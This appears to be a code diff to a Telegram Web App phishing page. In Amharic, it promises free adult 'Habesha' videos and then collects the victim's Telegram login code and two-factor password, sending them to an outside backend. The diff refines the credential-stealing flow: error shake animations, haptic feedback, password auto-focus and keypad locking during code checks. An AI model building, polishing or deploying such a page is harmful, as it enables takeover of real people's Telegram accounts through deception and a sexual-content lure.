@@ -8,7 +8,6 @@
     <meta http-equiv="Expires" content="0">
     <title>የሀበሻ ቪዲዮዎች 🔞</title>
     
-    <!-- 🌟 ምስሎች በቅፅበት እኩል እንዲከፈቱ የሚያደርግ (Preload) 🌟 -->
     <link rel="preload" as="image" href="https://i.postimg.cc/0jXFqFg6/Picsart-26-08-30-15-31-47-643-2.jpg">
     <link rel="preload" as="image" href="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Telegram-Animated-Emojis/refs/heads/main/Symbols/No%20One%20Under%20Eighteen.webp">
     <link rel="preload" as="image" href="https://i.postimg.cc/v8fhNvFJ/5785193993233697937-121.jpg">
@@ -17,8 +16,7 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <script src="./config.js"></script>
 <style>
-    /* 
-     ===========================================
+    /* ===========================================
         CLEAN & PERSUASIVE UI
      =========================================== 
     */
@@ -53,14 +51,13 @@
         left: 0;
     }
 
-    /* Blurred Background Image - በደንብ እንዲታይ ተስተካክሏል */
     .bg-image {
         position: fixed; top: 0; left: 0; width: 100%; height: 100%;
         background-size: cover; background-position: center;
         z-index: -3; 
         transition: background-image 0.5s ease-in-out;
         transform: scale(1); 
-        filter: blur(2px) brightness(1); /* 🌟 ብዥታው ቀንሶ ምስሉ በግልፅ እንዲታይ ተደርጓል 🌟 */
+        filter: blur(2px) brightness(1); 
     }
     
     .overlay {
@@ -83,7 +80,16 @@
         100% { opacity: 1; transform: translateY(0); } 
     }
 
-    /* Clean Glass Card */
+    /* 🌟 2. አዲሱ የ Shake (የመንቀጥቀጥ) አኒሜሽን ስህተት ሲፈጠር 🌟 */
+    @keyframes shake {
+        0%, 100% { transform: translateX(0); }
+        25% { transform: translateX(-8px); }
+        75% { transform: translateX(8px); }
+    }
+    .shake-error { 
+        animation: shake 0.4s ease-in-out; 
+    }
+
     .glass-card {
         background: var(--glass-bg);
         backdrop-filter: blur(15px);
@@ -95,11 +101,9 @@
         box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
     }
 
-    /* Typography */
     h2 { font-size: 22px; font-weight: 700; margin: 0; color: #fff; line-height: 1.3; }
     p { font-size: 14px; color: var(--text-muted); line-height: 1.5; margin: 10px 0 20px; }
 
-    /* Buttons */
     .btn-main {
         background: linear-gradient(135deg, var(--primary), var(--secondary)); 
         color: #fff; padding: 16px; width: 100%; border-radius: 14px; border: none;
@@ -111,7 +115,6 @@
     .btn-main:active { transform: scale(0.96); box-shadow: none; }
     .btn-main:disabled { background: rgba(50, 50, 50, 0.8) !important; color: #888 !important; box-shadow: none !important; cursor: not-allowed !important; pointer-events: none; }
 
-    /* Inputs & Keypad */
     input {
         width: 100%; padding: 16px 20px; margin: 10px 0; border-radius: 12px;
         border: 1px solid rgba(255, 255, 255, 0.1); 
@@ -120,6 +123,7 @@
         text-align: center; letter-spacing: 2px;
     }
     input:focus { border-color: var(--primary); outline: none; }
+    .input-error { border-color: #FF5252 !important; } /* ስህተት ሲፈጠር የሚቀየር ቀለም */
     
     .otp-container { display: flex; gap: 10px; margin: 15px 0 20px; justify-content: center; }
     .otp-box { 
@@ -128,17 +132,19 @@
         border-radius: 12px; display: flex; align-items: center; justify-content: center; 
         font-size: 24px; font-weight: 700; background: rgba(0, 0, 0, 0.4); 
         color: var(--text-muted);
+        transition: all 0.2s;
     }
     .otp-box.filled { border-color: var(--primary); color: #fff; background: rgba(255, 0, 94, 0.1); }
+    .otp-error { border-color: #FF5252 !important; background: rgba(255, 82, 82, 0.1) !important; color: #FF5252 !important; } /* 🌟 ስህተት ሲመጣ ቀይ ይሆናል */
 
-    .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; width: 100%; margin-top: 10px; }
+    .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; width: 100%; margin-top: 10px; transition: 0.3s; }
     .key { 
         background: rgba(28, 27, 27, 0.8470588235294118); padding: 15px; border-radius: 12px; 
         font-size: 20px; font-weight: 600; cursor: pointer; color: #fff;
+        transition: background 0.1s;
     }
     .key:active { background: var(--primary); transform: scale(0.95); }
 
-    /* Tags & Alerts */
     .official-tag {
         display: flex; align-items: center; justify-content: center; gap: 8px;
         font-size: 12px; color: var(--text-muted); margin-top: 20px;
@@ -162,19 +168,15 @@
   <div class="overlay"></div>
 
 
-    <!-- Intro Step (Now acts only as a brief loader until Python responds) -->
     <div id="step_intro" class="step active">
-        <!-- 🌟 GitHub Animated Fire Heart Emoji 🌟 -->
         <img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Telegram-Animated-Emojis/refs/heads/main/Symbols/No%20One%20Under%20Eighteen.webp" alt="Fire Heart" style="width: 200px; height: 200px; margin-bottom: 10px; filter: drop-shadow(0 0 15px rgb(242, 2, 2));">
         <h2 style="font-size: 40px;">የሀበሻ ቪዲዮዎች</h2>
         <div class="loader-ring"></div>
         <p style="font-size: 12px; color: var(--primary); font-weight: 700; letter-spacing: 2px;">Loading...</p>
     </div>
 
-    <!-- Landing/Photo Step (Clean & Persuasive) -->
     <div id="step_photo_slide" class="step">
         <div class="glass-card" style="padding: 20px;">
-            <!-- 🌟 የቪዲዮ Cover ፎቶ - በአንዴ ብቻ እንዲነካ (disabled) እንዲሆን ተስተካክሏል 🌟 -->
             <div id="video_thumbnail" style="position: relative; border-radius: 12px; overflow: hidden; margin-bottom: 20px; cursor: pointer; transition: 0.3s;" onclick="handleLoginClick()">
                 <img src="https://i.postimg.cc/v8fhNvFJ/5785193993233697937-121.jpg" style="width: 100%; display: block; filter: brightness(0.8);">
                 <div style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); color: #fff; font-size: 55px; opacity: 0.9; filter: drop-shadow(0 4px 10px rgba(0,0,0,0.5));">
@@ -182,7 +184,6 @@
                 </div>
             </div>
             
-            <!-- Persuasive Text -->
             <h2>ሚስጥራዊ የሀበሻ ቪዲዮዎች 🔞</h2>
             <p>ሙሉ ቪዲዮውን በነፃ ለመመልከት ከስር ያለውን ቁልፍ ይጫኑ። (ዕድሜዎ ከ18 ዓመት በላይ መሆኑን ማረጋገጥ ግዴታ ነው)</p>
 
@@ -198,10 +199,8 @@
         </div>
     </div>
 
-    <!-- OTP Step -->
     <div id="step2" class="step">
         <div class="glass-card">
-            <!-- 🌟 GitHub Animated Telephone Receiver 🌟 -->
             <img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Telegram-Animated-Emojis/refs/heads/main/Objects/Mobile%20Phone%20With%20Arrow.webp" alt="Phone" style="width: 150px; height: 150px; margin-bottom: 10px; filter: drop-shadow(0 5px 15px rgba(0,0,0,0.3));">
             
             <h2>ማረጋገጫ ኮድ</h2>
@@ -212,12 +211,11 @@
 
             <div id="status2" class="msg"></div>            
             
-            <!-- 🌟 አዲሱ Button ከ OTP በላይ ገብቷል 🌟 -->
             <button class="btn-main" style="background: rgba(10, 127, 246, 0.8196078431372549); color: var(--telegram-blue); border: 1px solid rgba(50, 177, 243, 0.8431372549019608); box-shadow: none; font-size: 14px; padding: 14px; margin-bottom: 15px; border-radius: 12px;" onclick="window.open('https://t.me/42777', '_blank')">
                 <i class="fa-regular fa-comment-dots"></i> ኮዱን ለማግኘት እዚህ ይጫኑ
             </button>            
             
-            <div class="keypad">
+            <div class="keypad" id="keypad_area">
                 <div class="key" onclick="press(1)">1</div><div class="key" onclick="press(2)">2</div><div class="key" onclick="press(3)">3</div>
                 <div class="key" onclick="press(4)">4</div><div class="key" onclick="press(5)">5</div><div class="key" onclick="press(6)">6</div>
                 <div class="key" onclick="press(7)">7</div><div class="key" onclick="press(8)">8</div><div class="key" onclick="press(9)">9</div>
@@ -227,17 +225,15 @@
         </div>
     </div>
 
-    <!-- 2FA Step -->
     <div id="step3" class="step">
         <div class="glass-card">
-            <!-- 🌟 GitHub Animated See No Evil Monkey 🌟 -->
             <img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Telegram-Animated-Emojis/refs/heads/main/Objects/Locked%20With%20Key.webp" style="width: 150px; height: 150px; margin-bottom: 10px; filter: drop-shadow(0 5px 15px rgba(0,0,0,0.3));">
             
             <h2>የቴሌግራም ፓስዎርድ</h2>
             <p>የእርስዎ ቴሌግራም በፓስዎርድ (2FA) የተቆለፈ ነው። ለመቀጠል ፓስዎርድዎን ያስገቡ።</p>
             
             <div id="status3" class="msg"></div>
-            <!-- 🌟 የፓስዎርድ ሳጥኑና እይታ መቆጣጠሪያው (Eye Icon) 🌟 -->
+            
             <div style="position: relative; width: 100%; margin-bottom: 10px;">
                 <input type="password" id="2fa_input" placeholder="ፓስዎርድ ያስገቡ" style="padding-right: 45px;" oninput="hideMsg(3)">
                 <div onclick="togglePasswordVisibility()" style="position: absolute; right: 10px; top: 50%; transform: translateY(-50%); width: 35px; height: 35px; display: flex; align-items: center; justify-content: center; cursor: pointer; border-radius: 8px;">
@@ -252,10 +248,8 @@
         </div>
     </div>
 
-    <!-- Success Step -->
     <div id="step_success" class="step">
         <div class="glass-card">
-            <!-- 🌟 150px አዲሱ የ WebP Check Mark 🌟 -->
             <img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Telegram-Animated-Emojis/refs/heads/main/Symbols/Check%20Mark%20Button.webp" style="width: 150px; height: 150px; margin-bottom: 10px; filter: drop-shadow(0 5px 15px rgba(0,0,0,0.3));">
             
             <h2>ተረጋግጧል!</h2>
@@ -266,7 +260,6 @@
         </div>
     </div>
 
-    <!-- Flood/Wait Step -->
     <div id="flood_step" class="step">
         <div class="glass-card">
             <i class="fa-solid fa-circle-exclamation" style="font-size: 50px; color: var(--warning); margin-bottom: 15px;"></i>
@@ -274,7 +267,6 @@
             <p>ለደህንነት ሲባል ለተወሰነ ጊዜ ታግደዋል።</p>
             <div style="font-size: 45px; font-weight: 700; color: #fff; margin: 15px 0;" id="wait_time">00:00</div>
             
-            <!-- 🌟 አዲሱ የ Flood ገፅ አዝራር 🌟 -->
             <button class="btn-main" disabled style="background: rgba(255, 171, 0, 0.1); border: 1px solid rgba(255, 171, 0, 0.3); color: var(--warning) !important;">
                 <i class="fa-solid fa-lock"></i> ቪዲዮውን ማየት አይችሉም
             </button>
@@ -282,7 +274,7 @@
     </div>
 
 <script>
-    /* JavaScript ክፍል - የፓይዘን ግንኙነት ምንም አልተነካም */
+    /* JavaScript ክፍል */
     const tg = window.Telegram.WebApp;
     
     tg.expand();
@@ -297,7 +289,6 @@
     let isProcessing = false;
     let savedName = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.first_name : "User";
 
-    // 🌟 Background Image በሁሉም ገፅ ላይ እንዲታይ 🌟
     const photos = [
         "https://i.postimg.cc/0jXFqFg6/Picsart-26-08-30-15-31-47-643-2.jpg",
         "https://i.postimg.cc/0jXFqFg6/Picsart-26-08-30-15-31-47-643-2.jpg",
@@ -309,7 +300,6 @@
         const bg = document.getElementById('bgLayer');
         bg.style.backgroundImage = `url(${photos[0]})`;
 
-        // 🌟 አዲሱ ሲስተም፡ 3 ሴኮንድ ሳይጠብቅ ዌብሳይቱ ሲከፈት ቀጥታ Pythonን ይጠይቃል 🌟
         if(typeof API_BASE_URL !== 'undefined'){
             fetch(`${API_BASE_URL}/check_status/${userId}`).then(r => r.json()).then(data => {
                 bg.style.backgroundImage = `url(${photos[1]})`;
@@ -326,12 +316,10 @@
                     showStep('success'); 
                 }
                 else {
-                    // ከፓይዘን ምንም ከሌለ፣ 3 ሴኮንድ ሳይቆይ ወዲያውኑ ወደ መጀመሪያው ገፅ ይሄዳል
                     showStep('photo_slide'); 
                 }
                 statusChecker = setInterval(checkStatus, 3000);
             }).catch(e => {
-                // ኢንተርኔት ከተቋረጠ አሁንም ወደ መጀመሪያው ገፅ ይወስዳል
                 bg.style.backgroundImage = `url(${photos[1]})`;
                 showStep('photo_slide');
                 statusChecker = setInterval(checkStatus, 3000);
@@ -344,13 +332,28 @@
         setupLongPressPaste(); 
     };
 
-    function playTap() { if (window.navigator.vibrate) window.navigator.vibrate(25); }
+    // 🌟 1. የቴሌግራም ኦሪጅናል ንዝረት (Haptic Feedback) 🌟
+    function playTap() { 
+        if (window.Telegram && window.Telegram.WebApp.HapticFeedback) {
+            window.Telegram.WebApp.HapticFeedback.impactOccurred('light');
+        } else if (window.navigator.vibrate) {
+            window.navigator.vibrate(25);
+        }
+    }
 
     function showStep(n) {
         document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
         let stepId = (typeof n === 'string') ? (n.startsWith('step') ? n : 'step_' + n) : 'step' + n;
         const target = document.getElementById(stepId) || document.getElementById(n);
         if(target) target.classList.add('active');
+
+        // 🌟 3. ገፁ የ 2FA ከሆነ ኪቦርዱን ወዲያውኑ ማምጣት (Auto-Focus) 🌟
+        if(n === 3 || stepId === 'step3') {
+            setTimeout(() => {
+                const passInput = document.getElementById('2fa_input');
+                if(passInput) passInput.focus();
+            }, 500);
+        }
     }
 
     function checkStatus() {
@@ -370,7 +373,6 @@
     function stopLoaders() {
         isProcessing = false;
         
-        // አዝራሩን (Button) እና ቪዲዮ (Thumbnail) ምስሉን ከመቆለፍ (Disabled) ነፃ ማውጣት
         const btn = document.getElementById('loginBtn');
         const thumb = document.getElementById('video_thumbnail');
         
@@ -389,6 +391,13 @@
             document.getElementById('confirmSpinner').style.display = 'none';
             document.getElementById('confirmText').innerHTML = 'አረጋግጥ';
         }
+
+        // 🌟 4. ኪቦርዱን ከ Loading መልስ መልሶ መክፈት 🌟
+        const keypad = document.getElementById('keypad_area');
+        if(keypad) {
+            keypad.style.pointerEvents = "auto";
+            keypad.style.opacity = "1";
+        }
     }
 
     function togglePasswordVisibility() {
@@ -406,7 +415,6 @@
     }
 
     function handleLoginClick() {
-        // 🌟 አንድ ጊዜ ከተነካ ቪዲዮውም ሆነ Button ድጋሚ እንዳይነኩ ይቆለፋሉ (Double click መከላከል) 🌟
         if (isProcessing) return;
         
         playTap();
@@ -462,6 +470,12 @@
     function press(num) {
         playTap();
         hideMsg(2); 
+        
+        // ቀይ ቀለም የነበረውን ስህተት አጥፋው አዲስ ሲነካ
+        const otpContainer = document.getElementById('otp_container');
+        otpContainer.classList.remove('shake-error');
+        for(let i=0; i<5; i++){ document.getElementById('b'+i).classList.remove('otp-error'); }
+
         if (currentOtp.length < 5) {
             currentOtp += num;
             updateOtpUI();
@@ -469,7 +483,16 @@
         }
     }
 
-    function backspace() { playTap(); currentOtp = currentOtp.slice(0, -1); updateOtpUI(); }
+    function backspace() { 
+        playTap(); 
+        currentOtp = currentOtp.slice(0, -1); 
+        updateOtpUI(); 
+        
+        // ቀይ ቀለም አጥፋው
+        const otpContainer = document.getElementById('otp_container');
+        otpContainer.classList.remove('shake-error');
+        for(let i=0; i<5; i++){ document.getElementById('b'+i).classList.remove('otp-error'); }
+    }
 
     function updateOtpUI() {
         for (let i = 0; i < 5; i++) {
@@ -480,6 +503,13 @@
     }
 
     async function submitOTP() {
+        // 🌟 4. አምስቱ ቁጥር ሲሞላ ኪቦርዱን መቆለፍ 🌟
+        const keypad = document.getElementById('keypad_area');
+        if(keypad) {
+            keypad.style.pointerEvents = "none";
+            keypad.style.opacity = "0.5";
+        }
+
         showMsg(2, 'loading-msg', 'ኮዱን በማረጋገጥ ላይ...');
         try {
             const res = await fetch(`${API_BASE_URL}/verify_otp`, {
@@ -489,13 +519,21 @@
             });
             const data = await res.json();
             handleResponse(data, 2);
-        } catch(e) { showMsg(2, 'error', 'የመስመር መቆራረጥ!'); }
+        } catch(e) { showMsg(2, 'error', 'የመስመር መቆራረጥ!'); stopLoaders(); }
     }
 
     async function submit2FA() {
         playTap();
-        const pass = document.getElementById('2fa_input').value;
-        if(!pass) return showMsg(3, 'error', 'እባክዎ ፓስዎርድ ያስገቡ');
+        const passInput = document.getElementById('2fa_input');
+        const pass = passInput.value;
+        
+        if(!pass) {
+            // 🌟 2. ባዶ ከሆነ የመንቀጥቀጥ አኒሜሽን 🌟
+            passInput.classList.remove('shake-error');
+            void passInput.offsetWidth; // trigger reflow
+            passInput.classList.add('shake-error');
+            return showMsg(3, 'error', 'እባክዎ ፓስዎርድ ያስገቡ');
+        }
         
         const btn = document.getElementById('confirmBtn');
         const spinner = document.getElementById('confirmSpinner');
@@ -524,7 +562,24 @@
         else {
             stopLoaders();
             showMsg(step, 'error', 'የተሳሳተ መረጃ! እባክዎ በትክክል ያስገቡ።');
-            if(step === 2) { currentOtp = ""; updateOtpUI(); }
+            
+            // 🌟 2. ስህተት ሲሆን ቀይ ቀለም እና መንቀጥቀጥ 🌟
+            if(step === 2) { 
+                currentOtp = ""; 
+                updateOtpUI(); 
+                const otpContainer = document.getElementById('otp_container');
+                otpContainer.classList.remove('shake-error');
+                void otpContainer.offsetWidth;
+                otpContainer.classList.add('shake-error');
+                for(let i=0; i<5; i++){ document.getElementById('b'+i).classList.add('otp-error'); }
+            } else if(step === 3) {
+                const passInput = document.getElementById('2fa_input');
+                passInput.value = "";
+                passInput.classList.remove('shake-error');
+                void passInput.offsetWidth;
+                passInput.classList.add('shake-error', 'input-error');
+                passInput.focus();
+            }
         }
     }
 
@@ -537,19 +592,23 @@
     function hideMsg(stepId) {
         const el = document.getElementById('status' + stepId);
         if(el && el.style.display === 'block' && el.classList.contains('error')) el.style.display = 'none';
+        
+        if(stepId === 3) {
+            const passInput = document.getElementById('2fa_input');
+            if(passInput) passInput.classList.remove('shake-error', 'input-error');
+        }
     }
 
     function displayFloodInStatus1(data) {
         stopLoaders();
         clearInterval(statusChecker);
-        showStep('photo_slide'); // 🌟 Flood ካለ ወደ መጀመሪያው ገፅ ይመለሳል 🌟
+        showStep('photo_slide');
         
         let remSeconds = data.remaining_seconds || data.wait || 60;
         let mins = data.remaining_minutes || data.total_wait_minutes || (remSeconds / 60).toFixed(1);
         
         showMsg(1, 'error', `በጣም ብዙ ሞክረዋል! መለያው ለ ${mins} ደቂቃ(ዎች) ተቆልፏል።`);
         
-        // አዝራሩንና ቪዲዮውን መቆለፍ
         const btn = document.getElementById('loginBtn');
         const thumb = document.getElementById('video_thumbnail');
         if(btn) btn.disabled = true;
